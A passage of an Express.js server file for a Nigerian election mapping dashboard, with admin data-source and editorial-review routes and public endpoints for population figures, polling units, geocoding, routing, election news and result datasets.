  const mode = req.body.mode === 'local' ? 'local' : 'drive';

  try {
    if (mode === 'local') {
      const settings = await readAdminSettings();
      settings.populationSource = {
        mode: 'local',
        fileId: '',
        mimeType: '',
        name: 'Local population-pvc-data.json',
        updatedAt: new Date().toISOString(),
        updatedBy: req.admin.email,
      };
      await writeJsonFile(ADMIN_SETTINGS_PATH, settings);
      return res.json(settings.populationSource);
    }

    const fileId = String(req.body.fileId || '').trim();
    const mimeType = String(req.body.mimeType || '').trim();

    if (!(await isServerDriveConfigured())) {
      return res.status(503).json({
        error: 'Google Drive is not configured on the server. Use local population data instead.',
      });
    }

    if (!fileId) {
      return res.status(400).json({ error: 'Select a Google Drive file first.' });
    }

    const metadata = await getFileMetadata(fileId);
    const data = await readPopulationData(fileId, mimeType || metadata.mimeType);
    const stateCount = data.statePopulation?.length || 0;
    const lgaCount = data.lgaPopulation?.length || 0;

    if (!stateCount || !lgaCount) {
      return res.status(400).json({
        error: 'The selected file does not look like valid population dashboard data.',
      });
    }

    const settings = await readAdminSettings();
    settings.populationSource = {
      mode: 'drive',
      fileId,
      mimeType: mimeType || metadata.mimeType,
      name: metadata.name,
      modifiedTime: metadata.modifiedTime,
      stateCount,
      lgaCount,
      updatedAt: new Date().toISOString(),
      updatedBy: req.admin.email,
    };
    await writeJsonFile(ADMIN_SETTINGS_PATH, settings);
    return res.json(settings.populationSource);
  } catch (error) {
    console.error('Error updating population source:', error.message || error);
    return res.status(500).json({ error: 'Unable to update the population data source.' });
  }
});

app.get('/api/admin/drive/status', requireAdminApi, async (_req, res) => {
  const configured = await isServerDriveConfigured();
  return res.json({
    configured,
    message: configured
      ? 'Server Google Drive credentials are available (credentials.json + token.json).'
      : 'Google Drive is not configured on the server. Admin sign-in no longer uses Google. Place server-side credentials.json and token.json to enable Drive browse/search, or use local population data.',
  });
});

app.get('/api/admin/drive/search', requireAdminApi, async (req, res) => {
  if (!(await isServerDriveConfigured())) {
    return res.status(503).json({
      error: 'Google Drive is not configured on the server. Use local population data, or add credentials.json and token.json for server-side Drive access.',
    });
  }

  const term = sanitizeDriveSearchTerm(req.query.q);

  if (!term) {
    return res.status(400).json({ error: 'Search term is required.' });
  }

  try {
    const termKey = term.toLowerCase();
    const files = (await getDashboardDriveDataFiles()).filter((file) =>
      [file.name, file.folderPath, file.path].some((value) => String(value || '').toLowerCase().includes(termKey))
    );
    return res.json(files);
  } catch (error) {
    console.error('Error handling /api/admin/drive/search:', error.message || error);
    return res.status(500).json({ error: 'Failed to search Google Drive files.' });
  }
});

app.get('/api/admin/drive/files', requireAdminApi, async (req, res) => {
  if (!(await isServerDriveConfigured())) {
    return res.status(503).json({
      error: 'Google Drive is not configured on the server. Use local population data, or add credentials.json and token.json for server-side Drive access.',
    });
  }

  try {
    const files = await getDashboardDriveDataFiles();
    return res.json(files);
  } catch (error) {
    console.error('Error handling /api/admin/drive/files:', error.message || error);
    return res.status(500).json({ error: 'Failed to list Google Drive files.' });
  }
});

app.get('/api/v1/contests', editorialRequired, async (req, res) => {
  try {
    const contests = await editorialStore.listPublishedContests({ office: req.query.office, from: req.query.from, to: req.query.to });
    return res.json({ status: 'published', contests });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.get('/api/v1/contests/:id', editorialRequired, async (req, res) => {
  if (!validUuid(req.params.id)) return res.status(400).json({ error: 'Invalid contest id.' });
  try {
    const contest = await editorialStore.getPublishedContest(req.params.id);
    return contest ? res.json({ status: 'published', contest }) : res.status(404).json({ error: 'Published contest not found.' });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.get('/api/v1/contests/:id/results', editorialRequired, async (req, res) => {
  if (!validUuid(req.params.id)) return res.status(400).json({ error: 'Invalid contest id.' });
  try {
    const result = await editorialStore.getPublishedResults(req.params.id);
    return result ? res.json(result) : res.status(404).json({ error: 'Published contest not found.' });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.get('/api/v1/datasets/:id/sources', editorialRequired, async (req, res) => {
  if (!validUuid(req.params.id)) return res.status(400).json({ error: 'Invalid dataset id.' });
  try {
    const sources = await editorialStore.getPublishedSources(req.params.id);
    return sources.length ? res.json({ datasetId: req.params.id, status: 'published', sources }) : res.status(404).json({ error: 'Published dataset not found.' });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.post('/api/v1/admin/datasets/drafts', editorialRequired, requireAdminWrite, async (req, res) => {
  try {
    const draft = await editorialStore.createDraft(req.body, req.admin.email);
    return res.status(201).json(draft);
  } catch (error) {
    return editorialError(res, error);
  }
});

app.get('/api/v1/admin/datasets', editorialRequired, requireAdminApi, async (_req, res) => {
  try {
    return res.json({ datasets: await editorialStore.listEditorialQueue() });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.get('/api/v1/admin/audit-events', editorialRequired, requireAdminApi, async (req, res) => {
  try {
    return res.json({ events: await editorialStore.listAuditEvents(req.query.limit) });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.post('/api/v1/admin/sources', editorialRequired, requireAdminWrite, sourceUpload.single('file'), async (req, res) => {
  try {
    if (!req.file || !hasExpectedMagic(req.file)) {
      return res.status(400).json({ error: 'Source file signature does not match its extension.' });
    }
    const stored = await storeSource(String(req.body.storageKey || ''), req.file.buffer);
    return res.status(201).json(stored);
  } catch (error) {
    return editorialError(res, error);
  }
});

app.get('/api/v1/admin/datasets/:id', editorialRequired, requireAdminApi, async (req, res) => {
  if (!validUuid(req.params.id)) return res.status(400).json({ error: 'Invalid dataset id.' });
  try {
    const dataset = await editorialStore.getDatasetForAdmin(req.params.id);
    return dataset ? res.json(dataset) : res.status(404).json({ error: 'Dataset not found.' });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.post('/api/v1/admin/datasets/:id/validate', editorialRequired, requireAdminWrite, async (req, res) => {
  if (!validUuid(req.params.id)) return res.status(400).json({ error: 'Invalid dataset id.' });
  try {
    const validation = await editorialStore.validateDraft(req.params.id, req.admin.email);
    return validation ? res.json({ id: req.params.id, validation }) : res.status(404).json({ error: 'Dataset not found.' });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.post('/api/v1/admin/datasets/:id/submit', editorialRequired, requireAdminWrite, async (req, res) => {
  if (!validUuid(req.params.id)) return res.status(400).json({ error: 'Invalid dataset id.' });
  try {
    const result = await editorialStore.submitDraft(req.params.id, req.admin.email);
    return result ? res.json(result) : res.status(404).json({ error: 'Dataset not found.' });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.post('/api/v1/admin/datasets/:id/review', editorialRequired, requireAdminWrite, async (req, res) => {
  if (!validUuid(req.params.id)) return res.status(400).json({ error: 'Invalid dataset id.' });
  if (!['approved', 'rejected'].includes(req.body?.decision)) return res.status(400).json({ error: 'Decision must be approved or rejected.' });
  try {
    const result = await editorialStore.reviewDataset(req.params.id, req.admin.email, req.body.decision, String(req.body.notes || '').slice(0, 4000));
    return result ? res.json(result) : res.status(404).json({ error: 'Dataset not found.' });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.post('/api/v1/admin/datasets/:id/publish', editorialRequired, requireAdminWrite, async (req, res) => {
  if (!validUuid(req.params.id)) return res.status(400).json({ error: 'Invalid dataset id.' });
  try {
    const result = await editorialStore.publishDataset(req.params.id, req.admin.email);
    return result ? res.json(result) : res.status(404).json({ error: 'Dataset not found.' });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.post('/api/v1/admin/datasets/:id/quarantine', editorialRequired, requireAdminWrite, async (req, res) => {
  if (!validUuid(req.params.id)) return res.status(400).json({ error: 'Invalid dataset id.' });
  try {
    const reason = String(req.body?.reason || '').slice(0, 4000);
    const result = await editorialStore.quarantineDataset(req.params.id, req.admin.email, reason);
    return result ? res.json(result) : res.status(404).json({ error: 'Dataset not found.' });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.get('/api/v1/admin/dataset-template', requireAdminApi, async (_req, res) => {
  try {
    const templatePath = path.join(__dirname, 'data', 'templates', 'result-dataset.example.json');
    const raw = await fs.readFile(templatePath, 'utf8');
    return res.type('json').send(raw);
  } catch (error) {
    return res.status(500).json({ error: 'Dataset template is unavailable.' });
  }
});

app.use('/admin', requireAdminPage, express.static(path.join(__dirname, 'admin'), {
  index: ['index.html'],
  setHeaders(res, filePath) {
    if (/\.(html|js)$/i.test(filePath)) res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  },
}));
app.use(express.static(path.join(__dirname, 'public'), {
  etag: false,
  lastModified: false,
  setHeaders(res, filePath) {
    if (/\.(html|js)$/i.test(filePath)) res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  },
}));

app.get('/api/drive/search', requireAdminApi, async (req, res) => {
  if (!(await isServerDriveConfigured())) {
    return res.status(503).json({
      error: 'Google Drive is not configured on the server. Admin sign-in no longer uses Google.',
    });
  }

  const { q } = req.query;

  if (!q) {
    return res.status(400).json({ error: 'Missing required query parameter: q' });
  }

  try {
    const files = await searchFiles(q);
    return res.json(files);
  } catch (error) {
    console.error('Error handling /api/drive/search:', error.message || error);
    return res.status(500).json({ error: 'Failed to search Google Drive files.' });
  }
});

app.get('/api/drive/list-supported', requireAdminApi, (req, res) => {
  return res.json(SUPPORTED_FILE_TYPES);
});

function preparePublicPopulationData(input) {
  const metadata = input?.metadata || {};
  const populationVerified = metadata.population?.status === 'verified';
  const states = (input?.statePopulation || [])
    .filter((row) => normalizeLookupKey(row.state) !== 'total')
    .map((row) => ({
      ...row,
      state: normalizeLookupKey(row.state) === 'fct abuja' ? 'FCT' : row.state,
      population: populationVerified ? row.population : null,
      populationStatus: populationVerified ? 'verified_estimate' : 'withheld',
      voterRegisterStatus: metadata.voterRegister?.status || 'unverified',
      voterRegisterAsOf: metadata.voterRegister?.asOf || null,
    }));
  const lgas = (input?.lgaPopulation || []).map((row) => ({
    ...row,
    population: populationVerified ? row.population : null,
    populationStatus: populationVerified ? 'verified_estimate' : 'withheld',
  }));
  const registeredVoters = states.reduce((sum, row) => sum + Number(row.registeredVoters || 0), 0);
  const stateSeriesCollectedPVCs = states.reduce((sum, row) => sum + Number(row.collectedPVCs || 0), 0);
  return {
    generatedAt: input?.generatedAt || null,
    metadata,
    statePopulation: states,
    lgaPopulation: lgas,
    nationalSummary: {
      registeredVoters,
      stateSeriesCollectedPVCs,
      reportNarrativeCollectedPVCs: metadata.voterRegister?.laterReportNarrativeCollectedPVCs ?? null,
      unexplainedDifference: metadata.voterRegister?.difference ?? null,
      status: metadata.voterRegister?.status || 'unverified',
      asOf: metadata.voterRegister?.asOf || null,
    },
  };
}

app.get('/api/v1/reference-summary', async (_req, res) => {
  try {
    const localData = JSON.parse(await fs.readFile(LOCAL_POPULATION_DATA_PATH, 'utf8'));
    const prepared = preparePublicPopulationData(localData);
    const dbStatus = getDbStatus();
    let puMeta = null;
    let policyMeta = null;
    try {
      puMeta = JSON.parse(await fs.readFile(path.join(__dirname, 'data', 'reference', 'inec-pu-coordinates.meta.json'), 'utf8'));
    } catch (_) {
      puMeta = null;
    }
    try {
      policyMeta = JSON.parse(await fs.readFile(path.join(__dirname, 'data', 'reference', 'pu-coordinate-policy.json'), 'utf8'));
    } catch (_) {
      policyMeta = null;
    }
    const withCoords = dbStatus.pollingUnitsWithCoordinates;
    const total = dbStatus.pollingUnits;
    const coverageParts = [];
    if (total > 0) {
      coverageParts.push(`${Number(withCoords).toLocaleString('en-US')} of ${Number(total).toLocaleString('en-US')} with INEC locator coordinates`);
      coverageParts.push(`${Number(total - withCoords).toLocaleString('en-US')} unmapped (no estimated positions)`);
    }
    return res.json({
      asOf: prepared.nationalSummary.asOf,
      voterRegister: prepared.nationalSummary,
      population: prepared.metadata.population,
      pollingUnits: {
        records: total,
        withCoordinates: withCoords,
        withoutCoordinates: total - withCoords,
        coordinateAccuracy:
          'INEC polling-unit locator coordinates only. Ward centroids and geocode estimates are not used.',
        coordinateSource: puMeta?.attribution || 'INEC public polling-unit locator / civic archive',
        coordinateCoverage: total > 0 ? coverageParts.join(' · ') + '.' : 'Polling-unit register unavailable.',
        coordinateFetchedAt: policyMeta?.revertedAt || puMeta?.fetchedAt || null,
      },
    });
  } catch (error) {
    return res.status(503).json({ error: 'Reference summary is unavailable.' });
  }
});

app.get('/api/population-data', async (req, res) => {
  try {
    const { fileId, mimeType } = await getPopulationSource(req);

    if (fileId) {
      try {
        const data = await readPopulationData(fileId, mimeType);
        return res.json(preparePublicPopulationData(data));
      } catch (driveError) {
        console.warn('Population Drive source unavailable; falling back to local JSON.', driveError.message || driveError);
      }
    }

    const localData = JSON.parse(await fs.readFile(LOCAL_POPULATION_DATA_PATH, 'utf8'));
    return res.json(preparePublicPopulationData(localData));
  } catch (error) {
    console.error('Error handling /api/population-data:', error.message || error);
    return res.status(500).json({ error: 'Failed to load population data.' });
  }
});

app.get('/api/population-data/status', async (req, res) => {
  try {
    const { fileId } = await getPopulationSource(req);

    if (fileId) {
      try {
        const metadata = await getFileMetadata(fileId);
        return res.json({
          source: 'drive',
          id: metadata.id,
          name: metadata.name,
          mimeType: metadata.mimeType,
          modifiedTime: metadata.modifiedTime,
          version: metadata.version,
          signature: [metadata.id, metadata.modifiedTime, metadata.version, metadata.md5Checksum]
            .filter(Boolean)
            .join(':'),
        });
      } catch (driveError) {
        console.warn(
          'Population Drive status unavailable; falling back to local JSON.',
          driveError.message || driveError
        );
      }
    }

    const stats = await fs.stat(LOCAL_POPULATION_DATA_PATH);
    return res.json({
      source: 'local',
      modifiedTime: stats.mtime.toISOString(),
      signature: `${stats.mtimeMs}:${stats.size}`,
    });
  } catch (error) {
    console.error('Error handling /api/population-data/status:', error.message || error);
    return res.status(500).json({ error: 'Failed to check population data status.' });
  }
});

app.get('/api/polling-units-data', async (req, res) => {
  try {
    const data = await buildPollingUnitDashboardData(LOCAL_POPULATION_DATA_PATH);
    return res.json(data);
  } catch (error) {
    console.error('Error handling /api/polling-units-data:', error.message || error);
    return res.status(500).json({ error: 'Failed to load polling unit data.' });
  }
});

app.get('/api/geocode', async (req, res) => {
  const q = String(req.query.q || '').trim();
  if (q.length < 3) {
    return res.status(400).json({ ok: false, error: 'Enter at least 3 characters for an address or place.' });
  }
  try {
    const url = 'https://nominatim.openstreetmap.org/search?' + new URLSearchParams({
      q,
      format: 'json',
      limit: '1',
      countrycodes: 'ng',
      addressdetails: '0',
    });
    const upstream = await fetch(url, {
      headers: {
        Accept: 'application/json',
        'User-Agent': 'Geoinfotech-Election-Dashboard/1.0 (https://github.com/Geoinfotech-Web/ggis-election-webapp)',
      },
      signal: AbortSignal.timeout(12000),
    });
    if (!upstream.ok) {
      return res.status(502).json({ ok: false, error: 'Geocoder unavailable.' });
    }
    const rows = await upstream.json();
    if (!Array.isArray(rows) || !rows.length) {
      return res.json({ ok: false, error: 'No match found in Nigeria for that address or place.' });
    }
    const hit = rows[0];
    const lat = Number(hit.lat);
    const lng = Number(hit.lon);
    if (!Number.isFinite(lat) || !Number.isFinite(lng)) {
      return res.json({ ok: false, error: 'Geocoder returned an invalid location.' });
    }
    return res.json({
      ok: true,
      lat,
      lng,
      label: hit.display_name || q,
    });
  } catch (error) {
    console.error('Error handling /api/geocode:', error.message || error);
    return res.status(502).json({ ok: false, error: 'Geocode request failed.' });
  }
});

app.get('/api/route', async (req, res) => {
  const fromLat = Number(req.query.fromLat);
  const fromLng = Number(req.query.fromLng);
  const toLat = Number(req.query.toLat);
  const toLng = Number(req.query.toLng);
  const validLat = (value) => Number.isFinite(value) && value >= -90 && value <= 90;
  const validLng = (value) => Number.isFinite(value) && value >= -180 && value <= 180;
  if (!validLat(fromLat) || !validLat(toLat) || !validLng(fromLng) || !validLng(toLng)) {
    return res.status(400).json({ ok: false, error: 'Valid route coordinates are required.' });
  }
  try {
    const url = `https://router.project-osrm.org/route/v1/driving/${fromLng},${fromLat};${toLng},${toLat}`
      + '?overview=full&geometries=geojson&steps=false&alternatives=false';
    const upstream = await fetch(url, {
      headers: {
        Accept: 'application/json',
        'User-Agent': 'Geoinfotech-Election-Dashboard/1.0 (https://github.com/Geoinfotech-Web/ggis-election-webapp)',
      },
      signal: AbortSignal.timeout(15000),
    });
    const data = upstream.ok ? await upstream.json() : null;
    const route = data?.routes?.[0];
    const coordinates = route?.geometry?.coordinates;
    if (!Array.isArray(coordinates) || coordinates.length < 2) {
      return res.status(502).json({ ok: false, error: 'No road route was found.' });
    }
    res.setHeader('Cache-Control', 'public, max-age=300');
    return res.json({
      ok: true,
      distance: Number(route.distance),
      duration: Number(route.duration),
      coordinates,
    });
  } catch (error) {
    console.error('Error handling /api/route:', error.message || error);
    return res.status(502).json({ ok: false, error: 'Road route request failed.' });
  }
});

app.get('/api/polling-directory', async (req, res) => {
  try {
    const tree = await getPollingTree();
    const stateKey = pickNormalizedKey(tree, req.query.state);
    const payload = { states: Object.keys(tree).sort((a, b) => a.localeCompare(b)) };
    if (stateKey) {
      payload.lgas = Object.keys(tree[stateKey]).sort((a, b) => a.localeCompare(b));
      const lgaKey = pickNormalizedKey(tree[stateKey], req.query.lga);
      if (lgaKey) {
        payload.wards = Object.keys(tree[stateKey][lgaKey]).sort((a, b) => a.localeCompare(b));
      }
    }
    res.setHeader('Cache-Control', 'public, max-age=3600');
    return res.json(payload);
  } catch (error) {
    console.error('Error handling /api/polling-directory:', error.message || error);
    return res.status(500).json({ error: 'Failed to load polling unit directory.' });
  }
});

const BBC_AFRICA_RSS_URL = 'https://feeds.bbci.co.uk/news/world/africa/rss.xml';
const NEWS_API_KEY = process.env.NEWS_API_KEY || '';

const NIGERIA_GEO_HINTS = [
  'nigeria', 'nigerian', 'inec', 'abuja', 'lagos', 'kano', 'rivers', 'kaduna',
  'oyo', 'ogun', 'anambra', 'enugu', 'imo', 'edo', 'delta', 'benue', 'plateau',
  'sokoto', 'katsina', 'bauchi', 'borno', 'yobe', 'adamawa', 'taraba', 'gombe',
  'jigawa', 'kebbi', 'zamfara', 'kwara', 'kogi', 'nasarawa', 'ekiti',
  'ondo', 'osun', 'cross river', 'akwa ibom', 'bayelsa', 'ebonyi', 'abia', 'fct',
];

const ELECTION_TOPIC_HINTS = [
  'election', 'electoral', 'inec', 'polling unit', 'ballot', 'presidential',
  'governorship', 'gubernatorial', 'voter', 'votes', 'campaign', 'candidate',
  'collation', 'returning officer', 'ec8', 'irev',
];

function decodeXmlText(value) {
  return String(value || '')
    .replace(/<!\[CDATA\[([\s\S]*?)\]\]>/g, '$1')
    .replace(/&amp;/g, '&')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .trim();
}

function readRssTag(item, tag) {
  const match = item.match(new RegExp(`<${tag}(?:\\s[^>]*)?>([\\s\\S]*?)</${tag}>`, 'i'));
  return decodeXmlText(match?.[1]);
}

function parseBbcRss(xml) {
  return [...String(xml || '').matchAll(/<item>([\s\S]*?)<\/item>/gi)]
    .map((match) => ({
      title: readRssTag(match[1], 'title'),
      url: readRssTag(match[1], 'link'),
      source: 'BBC News Africa',
      publishedAt: readRssTag(match[1], 'pubDate'),
    }))
    .filter((article) => article.title && article.url);
}

function articleMatchText(article) {
  let url = String(article?.url || '');
  try {
    const parsed = new URL(url);
    url = `${parsed.origin}${parsed.pathname}`;
  } catch (_err) {
    url = url.split(/[?#]/)[0];
  }
  return [
    article?.title,
    url,
    article?.source,
    article?.description,
  ].filter(Boolean).join(' ').toLowerCase();
}

function haystackIncludesHint(hay, hint) {
  const needle = String(hint || '').toLowerCase();
  if (!needle) return false;
  // Short tokens (state codes, "vote") must be whole words — avoid URL/query false positives.
  if (needle.length <= 4) {
    return new RegExp(`(?:^|[^a-z0-9])${needle.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}(?:[^a-z0-9]|$)`).test(hay);
  }
  return hay.includes(needle);
}

function isNigeriaElectionArticle(article) {
  const hay = articleMatchText(article);
  if (!hay) return false;
  const hasNigeria = NIGERIA_GEO_HINTS.some((hint) => haystackIncludesHint(hay, hint));
  const hasElection = ELECTION_TOPIC_HINTS.some((hint) => haystackIncludesHint(hay, hint));
  return hasNigeria && hasElection;
}

function filterNigeriaElectionNews(articles) {
  return (articles || []).filter(isNigeriaElectionArticle);
}

async function fetchBbcNigeriaElectionNews() {
  const response = await fetch(BBC_AFRICA_RSS_URL, {
    headers: { 'User-Agent': 'Nigeria-Election-GIS-Dashboard/1.0' },
    signal: AbortSignal.timeout(8000),
  });
  if (!response.ok) throw new Error(`BBC RSS returned ${response.status}`);
  return filterNigeriaElectionNews(parseBbcRss(await response.text())).slice(0, 4);
}

async function fetchNewsApiElectionNews() {
  if (!NEWS_API_KEY) return [];
  const url = new URL('https://newsapi.org/v2/everything');
  url.searchParams.set('q', 'Nigeria election OR INEC OR "polling unit"');
  url.searchParams.set('language', 'en');
  url.searchParams.set('sortBy', 'publishedAt');
  url.searchParams.set('pageSize', '12');
  url.searchParams.set('apiKey', NEWS_API_KEY);
  const response = await fetch(url, { signal: AbortSignal.timeout(8000) });
  if (!response.ok) throw new Error(`NewsAPI returned ${response.status}`);
  const data = await response.json();
  if (data.status !== 'ok') throw new Error(data.message || 'NewsAPI returned no result.');
  return filterNigeriaElectionNews((data.articles || []).map((article) => ({
    title: article.title,
    url: article.url,
    source: article.source?.name || 'NewsAPI',
    publishedAt: article.publishedAt,
    description: article.description || '',
  })).filter((article) => article.title && article.url));
}

const ELECTION_RESULT_ARCHIVE = {};

async function getElectionResultResponse(state) {
  const stateName = toDisplayCase(state || 'Nigeria');
  const archive = ELECTION_RESULT_ARCHIVE[normalizeLookupKey(stateName)] || [];
  let bbcNews = [];
  let newsApiNews = [];
  let gdeltNews = [];
  // Nigeria-locked query — do not use per-state defaults that pull other African stories.
  const query = encodeURIComponent('Nigeria election');
  const [newsApiResult, bbcResult, gdeltResult] = await Promise.allSettled([
    fetchNewsApiElectionNews(),
    fetchBbcNigeriaElectionNews(),
    fetch(`https://api.gdeltproject.org/api/v2/doc/doc?query=${query}&mode=artlist&format=json&maxrecords=8&sort=datedesc`, { signal: AbortSignal.timeout(8000) }),
  ]);

  if (newsApiResult.status === 'fulfilled') newsApiNews = newsApiResult.value;
  else console.warn('NewsAPI election refresh unavailable:', newsApiResult.reason?.message || newsApiResult.reason);

  if (bbcResult.status === 'fulfilled') bbcNews = bbcResult.value;
  else console.warn('BBC Nigeria news refresh unavailable:', bbcResult.reason?.message || bbcResult.reason);

  if (gdeltResult.status === 'fulfilled' && gdeltResult.value.ok) {
    const data = await gdeltResult.value.json();
    gdeltNews = filterNigeriaElectionNews((data.articles || []).map((article) => ({
      title: article.title,
      url: article.url,
      source: article.domain,
      publishedAt: article.seendate,
    })));
  } else if (gdeltResult.status === 'rejected') {
    console.warn('GDELT election news refresh unavailable:', gdeltResult.reason?.message || gdeltResult.reason);
  }

  const news = filterNigeriaElectionNews([...newsApiNews, ...bbcNews, ...gdeltNews])
    .filter((article, index, all) => article.url && all.findIndex((item) => item.url === article.url) === index)
    .slice(0, 8);

  if (!news.length) {
    news.push(...filterNigeriaElectionNews((archive[0]?.sources || []).map((source) => ({
      title: source.title,
      url: source.url,
      source: source.publisher,
      publishedAt: archive[0].declaredDate,
    }))));
  }

  return {
    state: stateName,
    latest: archive[0] || null,
    history: archive.slice(1),
    news,
    newsApi: 'NewsAPI + BBC (Nigeria-filtered) + GDELT 2.1 DOC API',
  };
}

app.get('/api/election-results', async (req, res) => {
  try {
    const payload = await getElectionResultResponse(req.query.state);
    res.setHeader('Cache-Control', 'public, max-age=900');
    return res.json(payload);
  } catch (error) {
    console.error('Election results refresh unavailable:', error.message || error);
    return res.status(500).json({ error: 'Unable to load election results.' });
  }
});

app.get('/api/election-results/gov-states', (req, res) => {
  try {
    ensureElectionResultsSeeded();
    const year = req.query.year != null && String(req.query.year) !== '' ? String(req.query.year) : null;
    const states = listAvailableGovStates(year);
    res.setHeader('Cache-Control', 'public, max-age=300');
    return res.json({ year, states, count: states.length });
  } catch (error) {
    return res.status(500).json({ error: 'Unable to list governorship states.' });
  }
});

app.get('/api/election-results/gov-catalog', (_req, res) => {
  try {
    ensureElectionResultsSeeded();
    const catalog = listGovCatalog();
    res.setHeader('Cache-Control', 'public, max-age=300');
    return res.json(catalog);
  } catch (error) {
    return res.status(500).json({ error: 'Unable to load governorship catalog.' });
  }
});

app.get('/api/party-colors', (_req, res) => {
  res.setHeader('Cache-Control', 'public, max-age=86400');
  return res.json(PARTY_COLORS);
});

app.get('/api/election-results/choropleth', async (req, res) => {
  try {
    const payload = await loadChoropleth({
      office: req.query.office,
      year: req.query.year,
      state: req.query.state,
    });
    res.setHeader('Cache-Control', 'public, max-age=3600');
    return res.json(payload);
  } catch (error) {
    console.error('Election choropleth unavailable:', error.message || error);
    return res.status(500).json({ error: 'Unable to load election map data.' });
  }
});

app.get('/api/election-results/datasets', (_req, res) => {
  res.setHeader('Cache-Control', 'public, max-age=3600');
  return res.json({
    sourceUrl: process.env.ELECTION_RESULTS_SOURCE_URL || 'https://www.inecnigeria.org/',
    irevUrl: process.env.INEC_IREV_URL || 'https://cvr.inecnigeria.org/',
    datasets: listAvailableDatasets().map((row) => ({
      office: row.office,
      year: row.year,
      state: row.state || null,
      level: row.level,
      file: row.file,
    })),
    catalogUrl: '/api/data-catalog',
  });
});

/** Public data explorer catalog — publishable datasets with download URLs. */
app.get('/api/data-catalog', (_req, res) => {
  try {
    const catalog = publicCatalogForClient(buildDataCatalog());
    res.setHeader('Cache-Control', 'public, max-age=120');
    return res.json(catalog);
  } catch (error) {
    console.error('Error building data catalog:', error.message || error);
    return res.status(500).json({ ok: false, error: 'Unable to build data catalog.' });
  }
});

app.get('/api/data-catalog/download', async (req, res) => {
  try {
    const id = String(req.query.id || '').trim();
    const format = String(req.query.format || 'json').trim().toLowerCase();
    if (!id) return res.status(400).json({ error: 'Dataset id is required.' });
    const entry = findCatalogEntry(id);
    if (!entry || entry.public === false) {
      return res.status(404).json({ error: 'Dataset not found or not public.' });
    }
    const fetchJson = async (href) => {
      const url = new URL(href, `${req.protocol}://${req.get('host')}`);
      // Prefer in-process handlers for known public APIs to avoid self-HTTP in Docker.
      if (url.pathname === '/api/population-data') {
        const localData = JSON.parse(await fs.readFile(LOCAL_POPULATION_DATA_PATH, 'utf8'));
        return preparePublicPopulationData(localData);
      }
      if (url.pathname === '/api/party-colors') return PARTY_COLORS;
      if (url.pathname === '/api/live-submissions') {
        const status = url.searchParams.get('status') || 'approved';
        const submissions = listLiveSubmissions({ status });
        return { ok: true, submissions, count: submissions.length };
      }
      const upstream = await fetch(url.toString(), {
        headers: { Accept: 'application/json' },
        signal: AbortSignal.timeout(20000),
      });
      if (!upstream.ok) {
        const err = new Error(`Upstream ${url.pathname} returned ${upstream.status}`);
        err.status = 502;
        throw err;
      }
      return upstream.json();
    };
    const result = await buildDownload(entry, format, fetchJson);
    if (result.redirect) return res.redirect(302, result.redirect);
    if (result.filePath) {
      res.setHeader('Content-Type', result.contentType || 'application/octet-stream');
      res.setHeader('Content-Disposition', `attachment; filename="${result.fileName || 'download.bin'}"`);
      return res.sendFile(result.filePath);
    }
    res.setHeader('Content-Type', result.contentType || 'application/octet-stream');
    res.setHeader('Content-Disposition', `attachment; filename="${result.fileName || 'download.bin'}"`);
    res.setHeader('Cache-Control', 'private, max-age=60');
    return res.send(result.body);
  } catch (error) {
    const status = Number(error.status) || 500;
    console.error('Error downloading catalog dataset:', error.message || error);
    return res.status(status).json({ error: error.message || 'Download failed.' });
  }
});

app.get('/api/election-results/analysis', (req, res) => {
  try {
    ensureElectionResultsSeeded();
    const filters = {
      office: req.query.office != null ? String(req.query.office) : 'pres',
      year: req.query.year != null ? String(req.query.year) : (req.query.election != null ? String(req.query.election) : ''),
      compare: req.query.compare != null ? String(req.query.compare) : '',
      party: req.query.party != null ? String(req.query.party) : 'all',
      region: req.query.region != null ? String(req.query.region) : 'all',
      state: req.query.state != null ? String(req.query.state) : 'all',
      momentumWeight: req.query.momentum != null ? Number(req.query.momentum) : undefined,
      retentionWeight: req.query.retention != null ? Number(req.query.retention) : undefined,
      competitiveCutoff: req.query.cutoff != null ? Number(req.query.cutoff) : undefined,
    };
    const payload = sliceAnalysisPayload(buildAnalysisBundle(filters), req.query.part);
    res.setHeader('Cache-Control', 'public, max-age=60');
    return res.json(payload);
  } catch (error) {
    console.error('Election analysis unavailable:', error.message || error);
    return res.status(500).json({ ok: false, error: 'Unable to build election analysis.' });
  }
});

// Preserve the original endpoint for existing bookmarks and integrations.
app.get('/api/election-results/ekiti', async (req, res) => {
  const payload = await getElectionResultResponse('Ekiti');
  res.setHeader('Cache-Control', 'public, max-age=900');
  return res.json(payload);
});

app.get('/api/polling-unit-points', async (req, res) => {
  try {
    const bbox = parseBBox(req.query.bbox);
    const searchLimit = req.query.q && !bbox ? Number(req.query.limit) || 25 : Number(req.query.limit) || 0;
    const wantsEnrichment = req.query.enrich === '1' || req.query.enrich === 'true';

    const filteredPoints = await loadPollingUnitPointsFromDb({
      state: req.query.state,
      lga: req.query.lga,
      ward: req.query.ward,
      q: req.query.q,
      bbox,
      limit: searchLimit,
    });

    let enrichedPoints = filteredPoints;
    if (wantsEnrichment) {
      const dashboardData = await buildPollingUnitDashboardData(LOCAL_POPULATION_DATA_PATH);
      const lgaLookup = new Map(
        (dashboardData.lgas || []).map((row) => [
          `${normalizeLookupKey(row.state)}::${normalizeLookupKey(row.lga)}`,
          row,
        ])
      );
      enrichedPoints = filteredPoints.map((point) => {
        const lgaRow = lgaLookup.get(
          `${normalizeLookupKey(point.state)}::${normalizeLookupKey(point.lga)}`
        );
        return {
          ...point,
          pollingUnits: lgaRow?.pollingUnits ?? null,
          wards: lgaRow?.wards ?? null,
          populationPerPollingUnit: lgaRow?.populationPerPollingUnit ?? null,
